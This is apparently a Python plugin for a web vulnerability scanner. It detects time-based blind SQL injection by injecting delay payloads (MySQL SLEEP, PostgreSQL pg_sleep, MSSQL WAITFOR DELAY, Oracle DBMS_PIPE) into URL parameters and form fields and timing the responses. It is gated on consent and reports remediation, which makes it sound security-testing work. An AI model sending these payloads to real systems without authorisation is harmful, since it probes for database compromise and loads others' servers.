"""
Time-Based SQL Injection Detection Plugin.
INTRUSIVE - Requires explicit user consent.
"""

import time
import requests
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
from typing import List

from src.plugins.base import PluginBase, PluginMetadata
from src.models.finding import Finding
from src.models.scan_context import ScanContext


class TimeBasedSQLiPlugin(PluginBase):
    """
    Time-based blind SQL injection detection.
    INTRUSIVE: Uses time delays that may affect server performance.
    """
    
    TIME_PAYLOADS = {
        "MySQL": [
            "' AND SLEEP(5)-- ",
            "' OR SLEEP(5)-- ",
            "1' AND SLEEP(5)-- ",
        ],
        "PostgreSQL": [
            "'; SELECT pg_sleep(5);-- ",
            "' AND pg_sleep(5)-- ",
        ],
        "MSSQL": [
            "'; WAITFOR DELAY '0:0:5'-- ",
            "' AND WAITFOR DELAY '0:0:5'-- ",
        ],
        "Oracle": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",
        ]
    }
    
    DELAY_THRESHOLD = 4
    BASELINE_SAMPLES = 2
    
    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="Time-Based Blind SQL Injection",
            id="time-based-sqli",
            severity_hint="high",
            intrusive=True,
            author="VulnScanner Team",
            description="Time-based blind SQL injection (INTRUSIVE)"
        )
    
    def analyze(self, context: ScanContext) -> List[Finding]:
        if not context.allow_intrusive:
            self.log_info("Intrusive checks not allowed, skipping time-based SQLi")
            return []
        
        findings = []
        vulnerable_params = []
        
        for param in context.attack_surface.url_parameters[:15]:
            result = self._test_time_based(param, context)
            if result:
                vulnerable_params.append(result)
        
        for form in context.attack_surface.forms[:10]:
            if form.method.upper() != "POST":
                continue
            for field in form.fields:
                if field.field_type in ["hidden", "submit", "button", "file"]:
                    continue
                result = self._test_form_time_based(form, field, context)
                if result:
                    vulnerable_params.append(result)
        
        if vulnerable_params:
            finding = self.create_finding(
                vuln_name="Time-Based Blind SQL Injection",
                short_intro=f"CONFIRMED: {len(vulnerable_params)} parameters vulnerable to blind SQL injection. "
                           "Database is executing injected time delay commands.",
                description=(
                    "The application is confirmed vulnerable to blind SQL injection. The server "
                    "responded with measurable delays when time-delay payloads were injected, "
                    "confirming that SQL commands are being executed. This is a critical "
                    "vulnerability that allows complete database compromise."
                ),
                affected_endpoints=[p["url"] for p in vulnerable_params],
                impact=[
                    f"Parameter '{p['param']}': {p['db_type']} - {p['delay']:.1f}s delay"
                    for p in vulnerable_params
                ] + [
                    "Complete database extraction possible",
                    "Authentication bypass",
                    "Data modification or deletion",
                    "Potential for OS command execution"
                ],
                proof_of_concept=[
                    f"1. Injected time delay payload into {vulnerable_params[0]['param']}",
                    f"2. Payload: {vulnerable_params[0]['payload'][:50]}",
                    f"3. Response delayed by {vulnerable_params[0]['delay']:.1f} seconds",
                    "4. Delay confirms server-side SQL execution"
                ],
                evidence=[{
                    "request": f"{p['method']} {p['url'][:80]}\nPayload: {p['payload']}",
                    "response": f"Response time: {p['delay']:.1f}s (expected ~5s delay)",
                    "description": f"{p['db_type']} time-based SQLi confirmed"
                } for p in vulnerable_params[:5]],
                remediation=[
                    "Use parameterized queries (prepared statements) immediately",
                    "This is a critical vulnerability requiring immediate attention",
                    "Implement input validation as defense in depth",
                    "Apply least privilege to database accounts",
                    "Consider using a WAF while fixing the code"
                ],
                references=[
                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                    "https://portswigger.net/web-security/sql-injection/blind"
                ],
                confidence="High",
                suggested_cvss={
                    "AV": "N",
                    "AC": "L",
                    "PR": "N",
                    "UI": "N",
                    "S": "C",
                    "C": "H",
                    "I": "H",
                    "A": "H"
                }
            )
            finding.target_url = context.target_url
            findings.append(finding)
        
        return findings
    
    def _test_time_based(self, param, context) -> dict:
        """Test a URL parameter for time-based SQLi."""
        parsed = urlparse(param.source_url)
        baseline = self._measure_baseline(param.source_url, context)
        
        for db_type, payloads in self.TIME_PAYLOADS.items():
            for payload in payloads[:1]:
                try:
                    params = parse_qs(parsed.query)
                    original_value = params.get(param.name, ["1"])[0]
                    params[param.name] = [original_value + payload]
                    
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(params, doseq=True), parsed.fragment
                    ))
                    
                    start_time = time.time()
                    response = requests.get(
                        test_url,
                        timeout=15,
                        headers={"User-Agent": context.user_agent},
                        verify=True
                    )
                    elapsed = time.time() - start_time
                    
                    if self._is_delayed(elapsed, baseline):
                        if not self._confirm_delay(test_url, context, baseline):
                            continue
                        return {
                            "url": param.source_url,
                            "param": param.name,
                            "payload": payload,
                            "db_type": db_type,
                            "delay": elapsed,
                            "method": "GET"
                        }
                    
                    time.sleep(context.rate_limit)
                    
                except requests.Timeout:
                    if self._is_delayed(15.0, baseline):
                        if not self._confirm_delay(test_url, context, baseline):
                            continue
                        return {
                            "url": param.source_url,
                            "param": param.name,
                            "payload": payload,
                            "db_type": db_type,
                            "delay": 15.0,
                            "method": "GET"
                        }
                except Exception as e:
                    self.log_debug(f"Error testing {param.name}: {e}")
        
        return None
    
    def _test_form_time_based(self, form, field, context) -> dict:
        """Test a form field for time-based SQLi."""
        for db_type, payloads in self.TIME_PAYLOADS.items():
            for payload in payloads[:1]:
                try:
                    data_base = {f.name: f.value or "test" for f in form.fields}
                    baseline = self._measure_baseline(form.action, context, method="POST", data=data_base)
                    
                    data = dict(data_base)
                    data[field.name] = data.get(field.name, "1") + payload
                    
                    start_time = time.time()
                    response = requests.post(
                        form.action,
                        data=data,
                        timeout=15,
                        headers={"User-Agent": context.user_agent},
                        verify=True
                    )
                    elapsed = time.time() - start_time
                    
                    if self._is_delayed(elapsed, baseline):
                        if not self._confirm_delay(form.action, context, baseline, method="POST", data=data):
                            continue
                        return {
                            "url": form.action,
                            "param": field.name,
                            "payload": payload,
                            "db_type": db_type,
                            "delay": elapsed,
                            "method": "POST"
                        }
                    
                    time.sleep(context.rate_limit)
                    
                except requests.Timeout:
                    if self._is_delayed(15.0, baseline):
                        if not self._confirm_delay(form.action, context, baseline, method="POST", data=data):
                            continue
                        return {
                            "url": form.action,
                            "param": field.name,
                            "payload": payload,
                            "db_type": db_type,
                            "delay": 15.0,
                            "method": "POST"
                        }
                except Exception:
                    continue
        
        return None
    
    def _measure_baseline(self, url: str, context, method: str = "GET", data: dict = None) -> float:
        """Measure baseline response time."""
        samples = []
        for _ in range(self.BASELINE_SAMPLES):
            try:
                start = time.time()
                if method == "POST":
                    requests.post(
                        url,
                        data=data or {},
                        timeout=15,
                        headers={"User-Agent": context.user_agent},
                        verify=True
                    )
                else:
                    requests.get(
                        url,
                        timeout=15,
                        headers={"User-Agent": context.user_agent},
                        verify=True
                    )
                samples.append(time.time() - start)
            except Exception:
                continue
        if not samples:
            return 0.0
        return sum(samples) / len(samples)
    
    def _is_delayed(self, elapsed: float, baseline: float) -> bool:
        return elapsed >= max(self.DELAY_THRESHOLD, baseline + 3.0)
    
    def _confirm_delay(self, url: str, context, baseline: float, method: str = "GET", data: dict = None) -> bool:
        """Confirm delay with a second request."""
        try:
            start = time.time()
            if method == "POST":
                requests.post(
                    url,
                    data=data or {},
                    timeout=15,
                    headers={"User-Agent": context.user_agent},
                    verify=True
                )
            else:
                requests.get(
                    url,
                    timeout=15,
                    headers={"User-Agent": context.user_agent},
                    verify=True
                )
            elapsed = time.time() - start
            return self._is_delayed(elapsed, baseline)
        except Exception:
            return False
